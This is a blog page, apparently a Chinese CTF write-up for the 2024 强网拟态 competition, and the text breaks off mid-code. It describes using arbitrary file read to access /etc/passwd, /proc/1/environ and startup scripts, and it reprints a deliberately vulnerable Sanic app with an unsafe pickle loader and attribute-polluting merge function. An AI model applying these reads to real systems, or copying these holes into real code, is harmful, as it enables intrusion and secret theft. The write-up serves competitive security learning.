@@ -1,0 +1,469 @@
+<!doctype html>
+<html lang="zh"><head>
+<title>2024强网拟态WP-- by MYGO!!! - Hello!</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+<link rel="shortcut icon" href="/images/2.ico" type="image/x-icon" />
+<meta name="description" content="Webcapoo 一血爽喽   f12发现读的图片，感觉应该能任意文件读取，读一下&#x2F;etc&#x2F;passwd  发现能读，再看一下环境变量&#x2F;proc&#x2F;1&#x2F;environ,没有 再看一下&#x2F;proc&#x2F;1&#x2F;cmdline，发现存在&#x2F;bin&#x2F;sh&#x2F;docker-entrypoint.sh  再尝试一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024强网拟态WP-- by MYGO!!!">
+<meta property="og:url" content="https://m1racle-7.github.io/2024/10/21/2024%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81WP/index.html">
+<meta property="og:site_name" content="Hello!">
+<meta property="og:description" content="Webcapoo 一血爽喽   f12发现读的图片，感觉应该能任意文件读取，读一下&#x2F;etc&#x2F;passwd  发现能读，再看一下环境变量&#x2F;proc&#x2F;1&#x2F;environ,没有 再看一下&#x2F;proc&#x2F;1&#x2F;cmdline，发现存在&#x2F;bin&#x2F;sh&#x2F;docker-entrypoint.sh  再尝试一下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019162216319.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019151935942.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019152114885.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019152243867.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019152349796.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019162312868.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019162519604.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019162618743.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019162930878.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019163249407.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019163313547.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019163729644.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019163729644.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019163823523.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019163915023.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019163906271.png">
+<meta property="article:published_time" content="2024-10-21T01:18:03.121Z">
+<meta property="article:modified_time" content="2024-10-21T01:19:37.575Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019162216319.png">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1729473612048">
+
+<link rel="stylesheet" href="/css/style.css?v=1729473612048">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1729473612048">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1729473612048"></script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.3.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(/images/b.png)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="John Doe"><img src="/images/a.jpg" alt="John Doe"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="John Doe">
+            <img src="/images/a.jpg" alt="John Doe" alt="John Doe">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>5</div>
+        <div><span>标签</span>3</div>
+        <div><span>分类</span>3</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="友链">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                友链
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        
+            <form id="search_form">
+                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+            </form>
+         
+    </div>
+</div>
+
+
+	<script async src="/js/search.js?v=1729473612049"></script>
+
+
+
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CTF/">CTF</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/PHP/">PHP</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/linux/">linux</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/PHP/" style="font-size: 20px;">PHP</a> <a href="/tags/linux/" style="font-size: 20px;">linux</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(3);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/">2024</a><span class="archive-list-count">5</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">最新文章</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/10/21/2024%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81WP/">2024强网拟态WP-- by MYGO!!!</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/09/%E6%97%A0curl%E3%80%81wget%E8%AE%BF%E9%97%AE%E4%B8%8B%E8%BD%BD%E4%BA%92%E8%81%94%E7%BD%91%E8%B5%84%E6%BA%90/">无curl、wget下的环境来访问下载工具</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/07/PHP%20Filter%E9%93%BE%E2%80%94%E2%80%94%E5%9F%BA%E4%BA%8Eoracle%E7%9A%84%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%94%BB%E5%87%BB/">PHP Filter链——基于oracle的文件读取攻击</a>
+          </li>
+        
+          <li>
+            <a href="/2024/09/27/%E6%94%BB%E5%87%BBPHP-FPM/">攻击PHP-FPM</a>
+          </li>
+        
+          <li>
+            <a href="/2024/05/21/2024ciscn%E5%88%9D%E8%B5%9BWP/">2024ciscn初赛WP</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+   
+    <div class="nexmoe-copyright">
+        &copy; 2024 John Doe
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: 40%;"> 
+            <img src="https://www.loliapi.com/bg/" alt="2024强网拟态WP-- by MYGO!!!" loading="lazy">
+            <h1>2024强网拟态WP-- by MYGO!!!</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2024年10月21日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/linux/">linux</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="capoo-一血"><a href="#capoo-一血" class="headerlink" title="capoo 一血"></a>capoo 一血</h2><p>爽喽</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019162216319.png" alt="image-20241019162216319" data-caption="image-20241019162216319" loading="lazy"></p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019151935942.png" alt="image-20241019151935942" data-caption="image-20241019151935942" loading="lazy"></p>
+<p>f12发现读的图片，感觉应该能任意文件读取，读一下&#x2F;etc&#x2F;passwd</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019152114885.png" alt="image-20241019152114885" data-caption="image-20241019152114885" loading="lazy"></p>
+<p>发现能读，再看一下环境变量&#x2F;proc&#x2F;1&#x2F;environ,没有</p>
+<p>再看一下&#x2F;proc&#x2F;1&#x2F;cmdline，发现存在&#x2F;bin&#x2F;sh&#x2F;docker-entrypoint.sh</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019152243867.png" alt="image-20241019152243867" data-caption="image-20241019152243867" loading="lazy"></p>
+<p>再尝试一下start.sh</p>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://raw.githubusercontent.com/M1racle-7/Tuchuang/master/tuchuang/image-20241019152349796.png" alt="image-20241019152349796" data-caption="image-20241019152349796" loading="lazy"></p>
+<p>找到flag名称，直接读就能出flag</p>
+<h2 id="ez-picker"><a href="#ez-picker" class="headerlink" title="ez_picker"></a>ez_picker</h2><p>源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> json, file <span class="keyword">as</span> file_, text, redirect</span><br><span class="line"><span class="keyword">from</span> sanic_cors <span class="keyword">import</span> CORS</span><br><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> secret_key</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">app = Sanic(<span class="string">&quot;App&quot;</span>)</span><br><span class="line">pickle_file = <span class="string">&quot;data.pkl&quot;</span></span><br><span class="line">my_object = &#123;&#125;</span><br><span class="line">users = []</span><br><span class="line"></span><br><span class="line">safe_modules = &#123;</span><br><span class="line">    <span class="string">&#x27;math&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;datetime&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;collections&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">safe_names = &#123;</span><br><span class="line">    <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;timedelta&#x27;</span>, <span class="string">&#x27;timezone&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;loads&#x27;</span>, <span class="string">&#x27;dumps&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;namedtuple&#x27;</span>, <span class="string">&#x27;deque&#x27;</span>, <span class="string">&#x27;Counter&#x27;</span>, <span class="string">&#x27;defaultdict&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> safe_modules <span class="keyword">and</span> name <span class="keyword">in</span> safe_names:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CORS(app, supports_credentials=<span class="literal">True</span>, origins=[<span class="string">&quot;http://localhost:8000&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">token_required</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">wrapper</span>(<span class="params">request, *args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> redirect(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result = jwt.decode(token, <span class="built_in">str</span>(secret_key), algorithms=[<span class="string">&#x27;HS256&#x27;</span>], options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">True</span>&#125;)</span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Token expired&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid token&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">if</span> result[<span class="string">&quot;role&quot;</span>] != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Permission Denied&quot;</span>&#125;, status=<span class="number">401</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> func(request, *args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_reader</span>(<span class="params">request</span>):</span><br><span class="line">    file = <span class="string">&quot;app.py&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line">    <span class="keyword">return</span> text(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="meta">@token_required</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/upload.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;No file provided&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    file = request.files.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    file_object = file[<span class="number">0</span>] <span class="keyword">if</span> <span class="built_in">isinstance</span>(file, <span class="built_in">list</span>) <span class="keyword">else</span> file</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        new_data = restricted_loads(file_object.body)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            my_object.update(new_data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Pickle object loaded but not updated&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(pickle_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            pickle.dump(my_object, f)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Pickle object updated&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">except</span> pickle.UnpicklingError:</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;Dangerous pickle file&quot;</span>, status=<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/register.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.json:</span><br><span class="line">        NewUser = User(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>)</span><br><span class="line">        merge(request.json, NewUser)</span><br><span class="line">        users.append(NewUser)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">    <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Register Success!&quot;</span>, <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;/login&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> file_(<span class="string">&#x27;templates/login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.json:</span><br><span class="line">        username = request.json.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">        password = request.json.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Username or password missing&quot;</span>&#125;, status=<span class="number">400</span>)</span><br><span class="line">        user = <span class="built_in">next</span>((u <span class="keyword">for</span> u <span class="keyword">in</span> users <span class="keyword">if</span> u.username == username), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            <span class="keyword">if</span> user.password == password:</span><br><span class="line">                data = &#123;<span class="string">&quot;user&quot;</span>: username, <span class="string">&quot;role&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">                data[<span class="string">&#x27;exp&#x27;</span>] = <span class="built_in">int</span>(time.time()) + <span class="number">60</span> * <span class="number">5</span></span><br><span class="line">                token = jwt.encode(data, <span class="built_in">str</span>(secret_key), algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">                response = json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;success&quot;</span>, <span class="string">&quot;redirect&quot;</span>: <span class="string">&quot;/upload&quot;</span>&#125;)</span><br><span class="line">                response.cookies[<span class="string">&quot;token&quot;</span>] = token</span><br><span class="line">                response.headers[<span class="string">&#x27;Access-Control-Allow-Origin&#x27;</span>] = request.headers.get(<span class="string">&#x27;origin&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;fail&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid password&quot;</span>&#125;, status=<span 